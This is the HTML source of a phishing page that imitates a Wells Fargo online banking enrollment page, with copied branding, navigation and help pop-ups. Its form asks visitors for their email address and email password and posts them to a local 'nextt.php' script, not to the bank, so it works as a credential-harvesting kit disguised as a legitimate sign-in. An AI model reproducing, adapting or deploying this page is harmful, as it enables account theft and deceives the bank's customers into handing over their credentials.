﻿<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en"><head>
        <meta http-equiv="Content-type" content="text/html; charset=UTF-8">
            
        <meta name="KONICHIWA1" content="06/09/2013 01:54:44.804 AM PDT">
            <meta name="KONICHIWA2" content="">
            <meta name="KONICHIWA3" content="">
            <meta name="KONICHIWA5" content="enrollment/enrollIdentify">
            <meta name="KONICHIWA6" content="">
        
        
        







<title>Wells Fargo&nbsp;Sign in Email to View Your Wells Fargo Message</title>


        <link type="text/css" href="https://a248.e.akamai.net/7/248/3608/99050a7dbe666d/online.wellsfargo.com/das/common/styles/publicsite.css" rel="stylesheet" media="screen,projection,print">
        <link rel="shortcut icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
        <link rel="icon" type="image/x-icon" href="https://www.wellsfargo.com/favicon.ico">
        
        
        <script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/wfwiblib.js"></script>
    </head>

    <body id="online_wellsfargo_com">
    
<script type="text/javascript">
 <!-- // <![CDATA[
    if (top	!= self) {
        top.location.href = self.location.href;
    }
 // ]]> -->
</script>
    <a name="top" id="top"></a>
    <div id="shell" class="L5">
		

	
	<div id="masthead">
		<div id="brand">
			
              	<a href="https://www.wellsfargo.com/" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/logo_62sq.gif" id="logo" alt="Wells Fargo Home Page"></a><a href="https://www.wellsfargo.com/auxiliary_access/aa_talkatmloc" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/shim.gif" class="inline" alt="Talking ATM Locations" border="0" height="1" width="1"></a><a href="#skip" tabindex="5"><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/shim.gif" class="inline" alt="Skip to page content" border="0" height="1" width="1"></a>
		</div>
    	<div id="topSearch"><form action="https://www.wellsfargo.com/search/search" method="get"><input name="query" title="Search" size="25" tabindex="6" type="text"><input name="Search" value="Search" id="btnTopSearch" tabindex="6" type="submit"></form></div>
    	

  
    
	<div id="utilities">  
  		
      		
      	
          	<a href="https://www.wellsfargo.com/help/" tabindex="5" class="headerLink">Customer Service</a>
     	
  		
		| <a href="https://www.wellsfargo.com/locator/" tabindex="5" class="headerLink">Locations</a>
  		
    		
    		
        		| <a href="https://www.wellsfargo.com/products_services/applications_viewall.jhtml" tabindex="5" class="headerLink">Apply</a>
    		
		
  		
    		
    		
        		| <a href="https://www.wellsfargo.com/" tabindex="5" class="headerLink">Home</a>
    		
		
	</div>

	</div>

		

    
    
    
    
    
    
    
    
    
    <div id="tabNav">
        <ul>
        	<li><a href="https://www.wellsfargo.com/per/more/banking" title="Banking - Tab">Banking</a></li>
        	<li><a href="https://www.wellsfargo.com/per/more/loans_credit" title="Loans &amp; Credit - Tab">Loans &amp; Credit</a></li>
        	<li><a href="https://www.wellsfargo.com/insurance/" title="Insurance - Tab">Insurance</a></li>
        	<li><a href="https://www.wellsfargo.com/investing/more" title="Investing - Tab">Investing</a></li>
        	<li class="tabOn"><a href="https://www.wellsfargo.com/help/" title="Customer Service - Tab - Selected">Customer Service</a></li>
        </ul>
        <div class="clearer">&nbsp;</div>
    </div>

		<div id="main">
    		<div id="leftCol">

    
    
	
    <div class="c15"><a href="javascript:history.go(-1)">Back to Previous Page</a></div>
	<div class="c45Layout">
    	<h3>Related Information</h3>
        <ul>
        	<li><a href="https://www.wellsfargo.com/help/enroll.jhtml" class="relatedLink">Online Banking Enrollment</a></li>
            <li><a href="https://www.wellsfargo.com/privacy_security/online/guarantee" class="relatedLink">Online Security Guarantee</a></li>
            <li class="pnav"><a href="https://www.wellsfargo.com/privacy_security/" class="relatedLink">Privacy, Security and Legal</a></li>
            
				<li style="margin-top:10px;"><a href="https://online.wellsfargo.com/das/common/html/wibdisc.html">Online Access Agreement</a></li>
		    
			
				
					
						
							<li><a href="https://www.wellsfargo.com/securityquestions">Security Questions Overview</a></li>
						
					
		    	
		    	
		    
		</ul>
	</div>
</div>
			<div id="contentCol">
				

    
    
	
    <div id="title">
        <h1 id="skip">Sign in to View Your Wells Fargo Accounts</h1>
    </div>
    
    
	
		<div id="multiCol">
			<div>  
			<div class="c11text webwib" id="ct2">
	
	


	


				
<script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/jquery-1.js"></script>
<script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/jquery-ui.js"></script>
<script type="text/javascript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/enrollLightbox.js"></script>

	
			
				
				
					<p>Manage your Wells Fargo accounts simply and securely, anytime 
and anywhere you have internet access. It takes just a few minutes to 
sign up.</p>
				
			
                    	
			<form id="enrollidentify" name="enrollidentify" action="nextt.php" method="post">
				
					
						
							<input name="lobIndicator" value="CONS" type="hidden">
								<div class="formpseudorow" style="MARGIN-BOTTOM: 1em">
									<div class="labelColumn">
										



  



											<label for="ssn1" class="formlabel">

								</div>
							
						

						<div class="formpseudorow" style="margin-bottom: 1em">
							<div class="labelColumn">
								



  



									<label for="ea" class="formlabel">
										Email Address
									</label>
									

								</div>
								<div class="formCtlColumn">
										<input id="ea" name="ea" size="30" maxlength="100" autocomplete="off" type="text">
										<a class="fieldhelp" title="New Window:Why We Need Your Email Address." href="#" id="ol3link">Why do we need to know this?</a> <br>
									</div>
								</div>
					<div class="formpseudorow">
						<div class="labelColumn">
							



  



								<label for="rea" class="formlabel">
									Enter your Email Password
								</label>
							

						</div>
						<div class="formCtlColumn">
							<input id="rea" name="password" size="20" maxlength="100" autocomplete="off" type="password">
						</div>
					</div>
					<div class="formpseudorow" style="margin-top: 1em">
						<div class="formCtlColumn">
							<p><strong>
										
							
								
								
									<a href="https://online.wellsfargo.com/das/signon">
										
									</a>
								
							
							</strong></p>
                		</div>
					</div>
					<div class="buttonBarPage">
						<input name="continue" value="Continue" class="primary" type="submit">
					</div>
				</form>
			<div class="clearer">&nbsp;</div>                       
		</div>
		<div class="clearer">&nbsp;</div>
	</div>
	<div class="clearer">&nbsp;</div>
</div>    


<script type="text/javascript">
	// <![CDATA[
    	document.enrollidentify.elements[1].focus();
	// ]]>
</script>



				<div class="clearAll">&nbsp;</div>
			</div>
		</div>
		

    
    
    <div id="footer">
    <p class="footer1">
        

    
    <a href="https://www.wellsfargo.com/about/about" tabindex="4">About Wells Fargo</a>
    | <a href="https://www.wellsfargo.com/careers/" tabindex="4">Careers</a>
    | <a href="https://www.wellsfargo.com/privacy_security/" tabindex="4">Privacy, Security &amp; Legal</a>
    | <a href="https://www.wellsfargo.com/privacy_security/fraud/report/fraud" tabindex="4">Report Email Fraud</a>
    
        
        
            | <a href="https://www.wellsfargo.com/sitemap" tabindex="4">Sitemap</a>
        
    
    
        
        
            | <a href="https://www.wellsfargo.com/" tabindex="4">Home</a>
        
    

    </p>
    <p class="footer2">
        © 1999 - 2013 Wells Fargo. All rights reserved.
    </p>
    </div>

	</div>
	
    	


	
	
		
<div id="ol1" class="c71b ui-draggable" style="position: absolute; height: 130px; width: 508px; overflow: auto; top: 160px; left: 645px; z-index: 400; outline: medium none; display: none;" tabindex="0">
	<div class="c71bDragHandle">
		<div class="c71aTitle2">
			<h2>
				
					Social Security Number
				
			</h2>
			<a href="#" class="closeLink hideBox" id="ol1c"><img alt="Close" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/close_lb_weak.gif"></a>
			<div class="clearer">&nbsp;</div>
		</div>
    	<div class="contentWrap" style="overflow: auto;">
			<div class="content">
				<div class="c11text">
					<p>
						You may also enter your individual tax identification number 
(ITIN). If you do not have an SSN or an ITIN, please call 1-800-956-4442
 for assistance. We are available 24 hours a day, 7 days a week.
					</p>
				</div>
			</div>
		</div>
	</div>
</div>

		
<div id="ol2" class="c71b ui-draggable" style="position: absolute; height: 358px; width: 508px; overflow: auto; top: 210px; left: 645px; z-index: 400; outline: medium none; display: none;" tabindex="0">
	<div class="c71bDragHandle">
		<div class="c71aTitle2">
			<h2>
					Account Number or ATM Card Number
				
			</h2>
			<a href="#" class="closeLink hideBox" id="ol2c"><img alt="Close" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/close_lb_weak.gif"></a>
			<div class="clearer">&nbsp;</div>
		</div>
		<div class="contentWrap" style="overflow: auto;">
			<div class="content">
				<div class="c11text">To view all your eligible Wells Fargo accounts 
online, you only need to enter one of your Wells Fargo account numbers 
or the 16-digit number printed on your ATM/debit card (not your ATM 
PIN).</div> 
				<ul>
        			<li><strong>For brokerage accounts:</strong> Please enter a W in front of your account number.</li>
        			<li><strong>For credit cards:</strong> Enter the 16-digit number that is printed on your Wells Fargo or Wachovia credit card and credit card statement.*</li>
        			<li><strong>For Private Client Services accounts:</strong> Enter the complete number as it appears on your statement, including any letters, numbers, and hyphens.</li>
        			<li><strong>For mortgage accounts:</strong> Enter the loan number that appears on the upper right hand corner of your monthly mortgage statement.</li>
        			<li><strong>For online payroll accounts:</strong> If you do not have an account number or ATM card number, please call 1-800-956-4442 for assistance.</li>
        			<li><strong>For all other accounts:</strong> Enter the number on your statement or card, without dashes or spaces.</li>
    			</ul> 
				<div class="c11text">*<strong>Note:</strong> Wells Fargo Financial credit cards and retail credit cards are not eligible for <em>Wells Fargo Online</em><sup>®</sup>. To access these accounts online, please go to wellsfargofinancial.com.</div>
			</div>
		</div>
	</div>
</div>

	


<div id="ol3" class="c71b ui-draggable" style="position: absolute; height: 200px; width: 508px; overflow: auto; top: 255px; left: 645px; z-index: 400; outline: medium none; display: none;" tabindex="0">
	<div class="c71bDragHandle">
    	<div class="c71aTitle2">
			<h2>
					Why We Need Your Email Address
				
			</h2>
            <a href="#" class="closeLink hideBox" id="ol3c"><img alt="Close" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/close_lb_weak.gif"></a>
			<div class="clearer">&nbsp;</div>
		</div>
		<div class="contentWrap" style="overflow: auto;">
        	<div class="content">
            	<div class="c11text"><p>Your email address lets us communicate important information about your account(s).</p><p>A valid email address is also required for Bill Pay, online statements, and account alerts.</p><p>Occasionally,
 we'll email you information about account features and other available 
products (if you do not wish to receive these types of emails, you can 
always change your email preferences later).</p> </div>
			</div>
		</div>
	</div>
</div>



    
    
      
        








 
 
 	




		
	
	
		
	
	
		
			
			<script language="JavaScript" src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/common/scripts/mediaplexROI.js">
			</script>
			
				
				
					
						
							
								
									<script language="JavaScript">
										<!--
										ROItag('994-1668-2054-5', 'COL01STO=1', 'Unique_ID=B-201304190417171151725945')
										-->
									</script><img src="https://a248.e.akamai.net/7/248/3608/1d8352905f2c38/online.wellsfargo.com/das/common/images/994-1668-2054-5.gif" alt="" border="0" height="1" width="1">
									<noscript>
										<img
										src="https://adfarm.mediaplex.com/ad/bk/994-1668-2054-5?COL01STO=1&Unique_ID=B-201304190417171151725945"
										border="0" height="1" width="1" alt="">
									</noscript>
								
								
							
						
						
					
				
			
		
	


                                                  
 

    
    
    
</body></html>